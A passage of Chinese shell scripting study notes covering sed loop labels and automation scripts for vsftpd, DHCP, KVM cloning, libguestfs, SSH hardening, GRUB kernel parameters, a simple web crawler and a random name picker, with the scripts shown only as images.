对于类似于这样的文件，有些数据已经是符合要求的，而有些数据则跨行了，如果还使用刚才的第一种方式，就会出错，如何解决这个问题呢？我们看看还有没有其他方式。

![image-20220326224920438](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326224920438.png)

与branch无条件跳转有所不同，test是一种有条件的跳转，使用时必须和s替换操作配合使用。当s替换操作成功时则执行test跳转，如果跳转的目标标签不存在，则跳转到指令的结束位置，反之，如果s替换操作不成功，则不执行test跳转操作。

上面这条命令在开始执行任何sed指令前先定义了一个名称为start的标签，然后条件匹配以冒号（:）结尾的行，找到满足条件的行后执行N指令读取下一行数据到模式空间，接着使用s替换指令将\n（换行符）以及后面的若干空格都替换为空（即删除操作），最后test有条件跳转，如果前面的s替换操作成功则执行t跳转指令，否则不执行t跳转指令。针对contact.txt数据文件其执行流程如下。

（1）读取文件的第1行，定义名称为start的标签，该行数据是以冒号结尾的，与/:$/匹配成功，因此会执行N指令将下一行数据追加读入模式空间。模式空间中的数据为第1行的数据和第2行数据，两行数据之间有一个换行符（\n）。接着使用s指令对模式空间中的两行数据进行替换操作，将换行符及若干个空格替换为空（将两行合并为一行）。注意在+前面有一个空格，+在正则表达式中表示前面的字符出现了至少一次。s替换指令执行成功就会导致test跳转，将指令跳转至start位置，再次拿模式空间中的数据（两行合并为一行后的数据）与/:$/匹配，因为合并后以9结尾，所以匹配失败。匹配失败就不会再执行N指令读取下一行数据，因为合并时已经将换行符和空格删除，所以也无法再次执行s替换操作，最终也不会再次执行test跳转，到此所有sed指令执行结束。

（2）所有sed指令都执行完毕后，sed自动逐行读取下一行数据（此时读取的下一行已经是第3行数据了）,mail:test@test.com不以冒号结尾，因此不会再执行N指令读取下一行数据。没有执行N指令就不会有多行数据，也没有\n换行符，s替换指令也不会被触发执行，因此test跳转也不会被执行，到此所有sed指令执行结束。

（3）所有sed指令都执行完毕后，sed自动逐行读取下一行数据（此时读取的下一行已经是第4行数据了）,phone:13612345678不以冒号结尾，因此不会再执行N指令读取下一行数据，没有执行N指令就不会有多行数据，也没有\n换行符，s替换指令也不会被触发执行，因此test跳转也不会被执行，到此所有sed指令执行结束。

（4）所有sed指令都执行完毕后，sed自动逐行读取下一行数据（此时读取的下一行已经是第5行数据了）, mail：确实以冒号结尾，因此会触发执行N指令将下一行数据（也就是第6行数据）追加读入模式空间，模式空间中的数据为第5行的数据和第6行的数据，两行数据指令有一个换行符（\n），接着使用s指令对模式空间中的两行数据进行替换操作，将换行符及若干个空格替换为空（将两行合并为一行）, s替换指令执行成功就会导致test跳转，将指令跳转至start位置，再次拿模式空间中的数据（两行合并为一行后的数据）与/:$/匹配，因为合并后以m结尾，所以匹配失败，匹配失败就不会再执行N指令读取下一行数据，因为合并时已经将换行符和空格删除，所以也无法再次执行s替换操作，最终也不会再次执行test跳转，到此所有sed指令执行结束，所有contact.txt文件的数据也都读取完毕，sed程序退出。

最后我们再看一个为MAC地址添加分隔符演示test标签的应用案例，MAC地址由6组十六进制数字组成，每组都包含两个十六进制数字。每组MAC地址之间都使用冒号分隔，使用sed可以删除冒号分隔符，也可以添加冒号分隔符。

![image-20220326230745614](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326230745614.png)

不使用循环时仅能在最后一组MAC前添加一个冒号分隔符，使用循环后就可以为所有MAC分组之间添加冒号分隔符。

### 6.3 实战案例：自动化配置vsftpd脚本

vsftpd是基于GPL协议的FTP服务器软件，在类Linux系统中被广泛地使用。在工作中我们可以使用vsftpd简单快捷地部署一台文件共享服务器，将公司中的公共文件放入FTP服务器可以很方便地实现数据共享功能，提高办公效率。vsftpd可以匿名访问，也可以基于账户认证的方式访问，使用默认匿名账户访问时为只读权限，而使用账户认证的方式访问时，每个用户访问的都是系统账户家目录，并对该目录具有读写权限。因为FTP服务器是常用文件共享服务器，如果每次使用都要手动部署配置会非常麻烦，如果能编写一个脚本实现自动化部署与配置vsftpd，对于释放劳动力、提高工作效率会大有帮助。

![image-20220327210211494](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327210211494.png)

![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\CD%5Cimage-20220327210211494.png)

![image-20220327210235207](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327210235207.png)

![image-20220327210249313](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327210249313.png)

![image-20220327210601893](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327210601893.png)

![image-20220327210620594](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327210620594.png)

该脚本执行后的主菜单界面效果如下。

![image-20220327210635185](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327210635185.png)



### 6.4 实战案例：自动化配置DHCP脚本

动态主机设置协议（Dynamic Host Configuration Protocol，简称DHCP）是一种局域网协议，在工作中搭建DHCP服务器的主要目的是为局域网内部的其他客户端自动分配IP地址、网关、DNS等网络参数，DHCP使用UDP协议传输数据。有了DHCP就再也不需要人工手动配置繁杂的网络参数，通过动态获取网络地址等参数，电脑小白也可以快速介入网络。DHCP采用客户端/服务器模型，一台DHCP服务器可以为多台客户端同时提供服务，客户端可以是电脑，也可以是手机或其他智能设备。简单DHCP拓扑结构如下图所示

![image-20220327211948000](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327211948000.png)

DHCP数据通信流程如下。

（1）客户端通过广播发送DHCP DISCOVER数据包，询问网络环境中谁是DHCP服务器。

（2）如果有DHCP服务器接收到DISCOVER数据包，该服务器会向客户端发送DHCP OFFER数据包，数据包中包括可以为客户端提供的IP地址、网关、DNS、租期网络参数。

（3）客户端收到服务器的OFFER数据包后，需要发送一个DHCPREQUEST数据包，正式向服务器发送请求获取IP地址、网关等网络参数。

（4）服务器收到客户端发送的REQUEST数据包后，向客户端发送一个DHCP ACK的确认数据包，完成整个DHCP过程。

DHCP数据通信流程如下图所示。

![image-20220327213420027](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327213420027.png)

因具有极强的便利性，目前DHCP已经变成了工作环境中必需的服务。下面我们通过编写Shell脚本实现一键部署配置DHCP服务。

![image-20220327232506909](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327232506909.png)

![image-20220327232515932](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327232515932.png)

![image-20220327232525072](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327232525072.png)

![image-20220327232543756](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327232543756.png)

### 6.5 实战案例：自动化克隆KVM虚拟机脚本

虽然虚拟化技术有很多，但是在Linux平台中KVM虚拟化是行业标准已经是不争的事实，很多云计算的底层架构也都采用KVM虚拟化。

一台正常的虚拟机应该由两部分组成：磁盘镜像（可以是多个磁盘镜像文件）和XML配置文件。磁盘镜像文件默认存储路径为/var/lib/libvirt/images/, XML配置文件默认存储路径为/etc/libvirt/qemu。

qemu也是一种虚拟技术

1.硬件虚拟化 硬件虚拟化代表：`KVM`

2.软件虚拟化 软件虚拟化代表：`Qemu`

https://blog.csdn.net/qq_34799070/article/details/107900861

真实主机上面的磁盘镜像文件对应的就是虚拟机中的磁盘设备，真实主机上面一个容量为20GB的磁盘镜像文件，映射到虚拟机中就是一个容量为20GB的磁盘设备（如/dev/sda和/dev/sdb等）。

![image-20220327235456209](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327235456209.png)

XML文件是虚拟机的硬件配置描述文件，该文件中描述了虚拟机的名称及虚拟机的CPU、内存、磁盘、网络设备等硬件信息。

![image-20220327235645689](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220327235645689.png)

明白了虚拟机的构成后，我们可以通过直接复制磁盘镜像文件和XML描述文件，并对XML文件做适当的修改，实现虚拟机的克隆操作。在镜像文件比较大时这种克隆方式会非常耗时。KVM支持多种格式的虚拟机磁盘镜像格式，如果我们创建的基础模板虚拟机采用的是qcow2格式的磁盘镜像文件，那么我们还可以通过快照的方式快速克隆虚拟机。不管使用什么方式的克隆，一定要注意将虚拟机中的唯一性信息提前删除掉，否则多台虚拟机之间就可能出现IP地址、MAC地址等信息冲突的问题。

本节我们要重点介绍的就是快照虚拟机，但是在讲解具体操作步骤之前，我们需要先了解qcow2快照的原理。qcow2支持一种COW（Copy On Write）写时复制的快照机制，下面我们通过几张图示来说明快照的整体流程。

如图6-5所示，我们计算机中的任何文件或目录最终一定是需要存储到磁盘设备上的，对于虚拟机的磁盘镜像文件也是一样的。虽然对于虚拟机来说，这个磁盘镜像文件就是虚拟机中的一个磁盘设备、一个文件系统，可能还包含了大量的数据文件，但是对于真实主机而言虚拟机的磁盘镜像文件与其他所有普通文件一样，所有的数据最终要被存储在物理主机的存储设备上。这里我们假设原始虚拟机磁盘镜像文件中包含三个文件：a.txt、b.txt和c.txt，如图6-5所示，给出了这三个文件在物理磁盘上的具体存储位置。

![image-20220328000442982](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328000442982.png)

当我们后期使用工具为原始磁盘镜像创建一份快照时，不管原始磁盘镜像数据容量有多大，都可以极其快速地创建快照，并且可以保持快照磁盘镜像文件的大小非常小。为什么呢？如图6-6所示，当我们为原始磁盘镜像创建快照时，计算机并不是将所有数据再复制一份，而仅仅只是在快照磁盘镜像中创建了与原始磁盘镜像一模一样的文件和目录结构，然后通过指针的方式指向了原始磁盘存储数据的位置。此时我们就会发现在原始磁盘镜像中看到的文件与快照磁盘镜像中的文件数据一模一样，但是并没有消耗过多的物理磁盘空间，而且创建文件或目录的数据结构和创建数据指针都是非常快速的操作。qcow2的快照既不占用过多的物理磁盘空间，又可以极快地完成快照备份

![image-20220328000632499](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328000632499.png)

当数据发生了改变又会怎么样呢？如图6-7所示，当我们在快照磁盘镜像中修改了a.txt时，就发生了数据的写操作，而根据COW（写时复制）的原则，一旦数据有写操作，就会先将数据复制到其他位置，紧跟着指针指向的位置发生了改变，然后将修改后的数据保存到新的存储位置上。从图中可以看出最终原始磁盘镜像中的a.txt和快照磁盘镜像中的a.txt已经是完全独立的两个文件了，而此时快照磁盘镜像文件的大小也会随之变大，因为此时有了真正的数据内容存储到了快照磁盘中。同样的道理，当我们在快照磁盘镜像中删除c.txt时（这也是数据写操作），最终仅仅是将快照磁盘镜像中的文件名与指针删除而已，真正的原始数据还依然存储在物理磁盘上面。而当我们在快照磁盘中新建文件d.txt时，也仅仅是对快照磁盘镜像做操作。新建文件名，写数据到物理磁盘的某个位置，创建文件名与数据位置的指针，而这些操作都不会对原始磁盘镜像产生任何影响。

![image-20220328000813116](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328000813116.png)

有了这些基础知识，你会问：快照有什么具体的应用案例吗？下面我们以使用快照快速对虚拟机进行克隆和还原为例，说明快照的具体应用。效果如图6-8所示，首先我们正常创建一台普通的虚拟机，并将虚拟机中的唯一性信息删除，然后就可以使用原始磁盘镜像文件快速快照若干台新的快照虚拟机。后面我们需要使用虚拟机时，就打开这些快照出来的虚拟机，写数据也是写入这些快照虚拟机镜像文件中，这样不管我们怎么写入修改数据，都不会对原始磁盘镜像文件产生任何影响，我们可以始终确保原始磁盘镜像文件是干净的。当某一天我们将快照出来的虚拟机玩坏了，就可以直接将该快照虚拟机删除，再重新创建一份快照即可，虚拟机又可以还原回原始的状态。这里的原始虚拟机磁盘镜像文件我们称其为后端盘，克隆出来的新虚拟机镜像文件我们称其为前端盘。

![image-20220328000952355](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328000952355.png)

具体如何创建快照虚拟机呢？这就需要使用qemu-img工具了，这是一个虚拟机镜像管理软件，使用该工具我们可以创建虚拟机镜像文件、转换镜像文件的格式，使用后端盘创建前端盘等操作

在没有虚拟机磁盘镜像文件的情况下，我们可以使用create指令创建一个新的磁盘镜像文件，通过下面这条命令可以创建一个容量为20GB、格式为qcow2、名称为base.img的镜像文件。

![image-20220328094044330](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328094044330.png)

如果我们已经有了一个名称为base.img的基础磁盘镜像文件，就可以再次使用create指令，基于base.img这个后端盘创建一个名称为clone01.qcow2的前端盘。创建完成后默认情况下两个磁盘镜像文件中的数据是一样的。

![image-20220328100100431](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328100100431.png)

如果使用后端盘克隆的前端盘，则使用info指令查看镜像文件信息时，可以看到backing file信息，找到该磁盘镜像文件的后端盘是谁。

![image-20220328100159901](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328100159901.png)

到此，我们已经可以快速使用原始虚拟机的镜像文件生产多个前端盘，但是如果想让一个虚拟机最终能够使用，XML也是必不可少的，而且多个XML文件中部分核心内容不可以冲突，如虚拟机名称、虚拟机的UUID、虚拟机的磁盘镜像文件、虚拟机的网卡MAC地址等信息，这些如果一个一个手动修改就比较麻烦。

下面开始编写一份完整的快速克隆虚拟机的Shell脚本，可以实现快速克隆虚拟机，这里假设我们有一个已经准备好的模板虚拟机centos7.5_6，包含后端磁盘镜像文件centos7.5_6.qcow和XML描述文件centos7.5_6.xml。

![image-20220328134607266](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328134607266.png)

![image-20220328134623166](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328134623166.png)

![image-20220328134453986](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328134453986.png)

![image-20220328134516275](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328134516275.png)

![image-20220328134525389](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328134525389.png)

![image-20220328134531796](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328134531796.png)

![image-20220328134708176](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328134708176.png)

### 6.6 实战案例：通过libguestfs管理KVM虚拟机脚本

正常情况下我们需要启动并登录虚拟机，才可以管理配置虚拟机中的内容。为了更方便简捷地管理虚拟机，libguestfs-tools-c提供了很多工具可以帮助我们更直接地管理KVM虚拟机。系统默认并不会安装libguestfs相关软件包，因此使用前我们必须要确保主机上已经安装了这些软件包。

下面的案例以我们的环境中有若干台虚拟机为基础。

![image-20220328144510002](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328144510002.png)、

![image-20220328144754754](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328144754754.png)

virt-df等相关工具除了可以通过虚拟机名称查看文件系统使用情况，还可以使用-a参数通过虚拟机镜像文件查看文件系统。

![image-20220328144813393](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328144813393.png)

使用virt-cat工具可以查看虚拟机中的文件内容。

![image-20220328144826363](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328144826363.png)

libguestfs-tools-c还为我们提供了一个镜像克隆工具virt-clone，使用该工具可以自动克隆某个虚拟机并复制修改对应的XML配置文件，但该工具并不会修改虚拟机内的配置文件，有些唯一性信息需要管理员自行清理，如IP地址、MAC地址、密码、密钥等信息。

![image-20220328144955184](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328144955184.png)

上面这条命令以centos7.5_6为模板克隆一台新虚拟机，新虚拟机名称为clone7.5,--auto-clone可以自动生产新的虚拟机镜像文件和XML配置文件，也可以使用自定义的方式自行指定虚拟机镜像文件和XML配置文件的路径和名称。

virt-copy-in工具可以将真实主机上的文件或目录复制到虚拟机中，复制时要确保虚拟机是关机状态。virt-copy-out工具则可以将虚拟机内的文件或目录复制到真实主机。

![image-20220328145132935](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328145132935.png)

使用virt-edit工具可以直接修改虚拟机中的文件，需要确保虚拟机处于关闭状态。

![image-20220328145142942](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328145142942.png)

使用virt-ls工具可以查看虚拟机内的文件或目录列表。

![image-20220328145923456](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328145923456.png)

使用virt-sysprep工具可以快速地清除虚拟机内的唯一性信息。

![image-20220328145953045](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328145953045.png)

使用virt-tail可以动态查看虚拟机内某个文件的后10行内容，使用Ctrl+C组合键可以终止查看文件。

![image-20220328150025818](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328150025818.png)

使用virt-tar-in工具可以将真实主机的tar文件解压复制到虚拟机中，virt-tar-out命令可以将虚拟机中的文件打包复制到真实主机。

![image-20220328150035085](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328150035085.png)

最后我们再看看guestmount这个工具，使用该工具可以将虚拟机中的文件系统直接挂载到真实主机，而从就可以使用任何编辑工具对虚拟机内的文件进行任意修改了。使用该工具前需要确认虚拟机处于关闭状态。挂载时可以使用-i自动将虚拟机的文件系统挂载到真实主机，也可以使用-m参数指定挂载特定的文件系统到真实主机。

![image-20220328151525861](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328151525861.png)

![image-20220328153931297](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328153931297.png)

上面列出的就是虚拟机的文件系统目录结构，这样在不需要启动虚拟机的情况下，我们就可以直接为虚拟机网卡配置IP地址，为虚拟机设置初始密码，添加、删除账户等。为了操作更方便，还可以结合Shell脚本实现自动化修改虚拟机配置。

下面这个案例脚本是以修改网卡参数为范本的自动化脚本，修改其他虚拟机配置也可以参考该脚本。

![image-20220328185352642](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328185352642.png)

![image-20220328185414707](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328185414707.png)

![image-20220328185425690](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328185425690.png)

### 6.7 实战案例：自动化配置SSH安全策略脚本

SSH是Secure Shell的简称，可以为远程登录会话和其他网络服务提供安全性的协议。生产环境中基本都是使用SSH远程管理自己的服务器主机，SSH服务由客户端和服务器两部分组成，Linux系统一般情况下默认都会安装openssh-server（服务端软件）和openssh-clients（客户端软件）这两个软件包，而实际工作中我们一般会在Windows操作系统上安装客户端软件远程连接SSH服务，Windows常用的SSH客户端软件有Xshell、SecureCRT、Putty等。

因为SSH是加密传输数据的，所以可以有效地防止远程管理过程中的信息泄露。当然前提是我们正确地配置了SSH服务，而默认有些SSH的配置并不合理，因此就需要我们手动修改配置文件。因为有大量的主机需要修改，重复的人肉运维是毫无意义的，所以这里又需要我们的Shell脚本出马了，使用脚本自动化完成大量重复的工作任务，才是提升生产效率的核心，也是编写脚本的根本目的。

CentOS7系统中SSH服务端的默认配置文件是/etc/ssh/sshd_config，通过跳转该配置文件中的参数可以让我们的SSH服务更安全。

默认SSH服务采用的是22端口，该端口是人尽皆知的标准端口，通过Port参数修改该端口可以有效防止网络上大量扫射类的攻击。这类攻击并不会对特定的主机进行扫描后再攻击，而是简单粗暴地对整个特定的网络中特定的端口进行攻击，这种攻击要的是成功概率。当我们修改了端口后，这种攻击工具并不会自动识别到我们修改后的端口，也无法对新端口进行攻击。

默认SSH服务会监听整个计算机所有网卡IP的端口，通过ListenAddress参数可以设置其仅监听特定的IP地址，如仅监听内网IP地址，这样也可以有效降低被攻击的可能性

默认SSH是允许超级管理员root远程登录的，这对于线上服务器来说是非常危险的事情，通过修改PermitRootLogin参数的值可以禁止root登录。

SSH支持多种远程连接的账户认证方式，如密码认证、密钥认证、Kerberos认证等。为了防止密码泄露，我们可以通过设置PasswordAuthentication参数禁用密码认证，在实际使用时仅使用密钥认证会更安全。

在生产环境中特别是Linux系统通常使用的都是字符界面管理服务器，甚少有使用特性的情况，而默认SSH服务开启了图形转发功能，通过设置X11Forwarding可以禁止图形转发。

通过AllowUsers和AllowGroups可以设置用户和组的白名单列表，这样以后仅允许在白名单列表中的用户或组远程登录SSH服务器，其他用户和组默认拒绝登录。白名单配置的语法格式为：AllowUsers用户名1用户名2用户名3@IP或网段．.., AllowGroups组名1@IP组名2组名3...

通过DenyUsers和DenyGroups可以设置用户和组的黑名单列表，这样就可以拒绝特定的用户和组远程登录SSH服务器。黑名单配置的语法格式为：DenyUsers用户名1用户名2@IP或网段用户名3 ...,DenyGroups组名1@IP或网段组名2组名3...

不管是黑名单还是白名单，在限制用户和组的同时可以限制用户的来源。如禁止tom从192.168.4.5这台主机远程，但是tom可以从其他主机远程SSH服务器。

默认SSH会对远程主机进行DNS的反向解析，这会浪费大量的时间，我们可以通过UseDNS参数禁止其查询DNS服务器。

下面开始编写脚本实现自动化修改SSH配置文件，有再多的服务器主机只要执行脚本都可完成配置的初始化工作。

![image-20220328191900989](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328191900989.png)

### 6.8 实战案例：基于GRUB配置文件修改内核启动参数脚本

GNU GRUB是基于GNU项目的一款引导启动程序，有了它我们才可以加载Linux内核、启动计算机操作系统，CentOS7系统默认使用的是GRUB2作为其引导启动程序。因为整个Linux内核都是由GRUB引导启动的，所以如果我们需要调整内核参数，则也可以通过直接修改GRUB配置文件的方式来实现。

CentOS7与之前版本的CentOS的一个比较大的区别就是网卡名称，老版本的CentOS一般采用的是eth0、eth1、eth2..．这种命名规则，而CentOS7系统中的网卡名称多数以ens或enp开头。新版本网卡的命名规则与网卡的硬件信息以及设备插槽的位置有关，由一系列规则决定了设备的最终名称。例如，主板集成的网卡名称为eno1，独立PCI-e网卡名称为ens1，对于获取不到硬件信息但是可以获取到插槽位置信息的网卡名称为enp2s0，如果所有信息都无法获取则使用传统的名称eth0。这样的规则有利于我们识别网卡的类型与接口，但是也为生产环境带来了不小的麻烦，因为我们会有很多自动化脚本都会调用网卡名称，如果网卡名称五花八门无法统一，那么编写脚本的难度就会变大，而且对于公司原有的脚本也需要做大量的调整，这是任何企业都不想看到的，怎么解决呢？只需要我们在GRUB配置文件中添加两个内核启动参数就可以：biosdevname=0net.ifnames=0。修改的方法是修改/etc/default /grub文件，将需要设置的内核参数设置为GRUB_CMDLINE_LINUX变量的值即可，多个内核参数之间使用空格分隔，最后再使用grub2-mkconfig重新生成GRUB配置文件即可。

SELinux是美国国家安全局（NSA）在Linux上设计的一套强制访问控制系统，从2.6版本开始被嵌入内核模块，目前CentOS、RHEL、Debain等系统默认都会激活该模块，然而在实际生产环境中往往都需要关闭SELinux，通过内核参数selinux=0就可以禁用SELinux。

如同一个大厦会被分割为很多小房间，每个房间分配一个房间号，为了更有效地利用系统中的内存空间，Linux系统默认会将物理内存划分成若干大小为4KB的页面，几GB甚至几十GB的内存容量会被划分为极多个4KB的小空间。如果一个大厦有很多房间，则物业会为所有房间设计一个查询信息表，表中记录有每个房间的位置、负责人、联系电话等信息，当我们需要找到大厦中的某个人或房间时，就需要去服务台查询人员信息与房间信息，而Linux系统也需要通过一个页面信息表（Page Table）来定位具体的数据位置，但是因为4KB的小页面太多，就会导致完整的映射表太大，检索和查询数据的速度变慢。为了解决这个问题，Linux系统提供了两个内核参数可以开启大页（Huge Page）功能。hugepagesz=N用来设置页大小，hugepages=N用来设置大页的数量，也就是将房间设计得更大些，这样房间的个数自然就减少了，房间的个数减少，需要查询的信息表就更简洁，查询房间信息的速度也就加快了。

如果我们不需要在系统中使用IPv6网络，还可以通过ipv6.disable=1参数禁用IPv6功能。

为了防止其他人修改GRUB参数，我们还可以为GRUB设置密码，这样可以防止其他人在启动时修改GRUB参数。有两种方法可以为GRUB设置密码：交互方式和非交互方式。使用grub2-setpassword可以自动完成设置密码的所有步骤，但执行该命令需要我们交互式地输入两次密码，该工具会自动将密码对应的密文信息写入/boot/grub2/user.cfg文件中。另外一种方式是先使用grub2-mkpasswd-pbkdf2命令生成一个密码的密文信息，然后使用脚本将该密文信息写入/etc/grub.d/01_users文件中，最后使用grub2-mkconfig重新生成GRUB配置文件即可，优点是非交互、适合批量操作。

我们可以将上面这些功能全部写入脚本，编写自动化调优内核启动参数的脚本。

![image-20220328203113993](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328203113993.png)

![image-20220328203120649](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328203120649.png)

### 6.9 实战案例：网络爬虫脚本

网络爬虫又被称为网络蜘蛛或网络机器人，是按照某种规则自动到网络上抓取数据的程序或脚本。例如，我们在网络上面发现了大量的图片或视频等资料，如果你使用鼠标去一张一张地右击进行下载，会消耗大量的时间与精力，此时我们可以设计一个脚本自动抓取网络上的图片或视频的链接，自动批量下载数据。根据网页数据抓取的深度、数据的复杂度不同，设计网络爬虫的难度也有所不同

首先来看看http://www.tmooc.cn/这个网站，该网站的一个特色就是网页基本由图片构成

![image-20220328203505147](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328203505147.png)

如果我们想一次性将这些图片都下载下来，如何操作呢？首先我们需要分析网页源码，可以使用curl下载源码，然后慢慢分析网页的数据构成。

![image-20220328203706287](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328203706287.png)

![image-20220328203809705](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328203809705.png)

整个网页的所有源码有一千多行，通过查看网页源码就可以找到图片数据的原始链接，也就是种子URL，而我们需要的就是这些种子URL。仔细观察分析源文件可知，这个网站的图片链接在源码文件中的展现形式如下：

![image-20220328204305984](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328204305984.png)

因此我们需要将包含＜img的数据过滤出来，然后将多余的数据清洗掉即可。

![image-20220328205228443](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328205228443.png)

![image-20220328205636985](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328205636985.png)

数据被处理到这里还不是最终需要的种子URL，我们还需要继续将多余的字符串清洗掉，源码文件在＜img前面有大量的空格需要删除，另外就是＜img class=" logo"src="这些字符串需要删除，最后还有类似于logo.png这样的图片文件后面的所有数据都需要删除。

使用．*可以匹配任意长度的任意字符，将．*src=”替换为空就可以实现删除的效果。再将”.*替换为空就可以将双引号及其后面的所有内容删除。这样最终就成功获取了需要的种子URL，也就是这些图片的真实下载链接。

![image-20220328210732266](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328210732266.png)

最后我们将上面的这些命令和脚本结合就可以循环自动下载所有图片了。完整的参考脚本如下。

![image-20220328214455699](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328214455699.png)

如果我们需要抓取的页面不止一个呢？这就需要更全面地分析网页源代码，找出规律就可以获取需要的数据。比如www.dytt8.net这个网站，里面全部都是视频资源，打开网站首页不难发现网站被分为了几个板块：最新电影、经典电影、国内电影等。

![image-20220328222537555](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328222537555.png)

![image-20220328223112756](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328223112756.png)

再打开其中一个链接，分析经典影片这个页面的源码可以获得如下格式的电影列表信息，该信息的网页链接仅包含路径，而缺少了网站的域名，因此需要我们添加域名，并需要清洗掉多余的数据。

![image-20220328225009703](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328225009703.png)

![image-20220328225015697](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328225015697.png)

打开其中任意一个网页链接，查看源码后就可以获取到如下格式的视频链接格式。

![image-20220328225029117](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328225029117.png)

结合sed和循环就可以一次性获取所有视频的原始链接，因为这些都是容量比较大的视频文件，脚本获取视频链接的路径后可以直接复制到P2P下载工具中以更快速地批量下载，如迅雷等下载软件。

本案例完整的参考脚本如下，本脚本仅过滤一级页面的下载链接

![image-20220328225318125](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328225318125.png)

![image-20220328230340688](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328230340688.png)

![image-20220328230530464](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328230530464.png)

### 6.10 Shell小游戏之点名抽奖器

企业年会、学校的课堂上往往都需要随机点名器，点名器为我们节约了大量的时间与精力去完成快速抽取人员名单的任务，也是相对比较公平的一种方式。点名器首先需要一个保存所有人名列表的文件，其次就是编写程序随机从人员文件中抽取姓名，每次随机从文件中显示一行即可实现。

![image-20220328231618961](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328231618961.png)

![image-20220328231634871](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220328231634871.png)

## 第7章 不可思议的编程语言awk

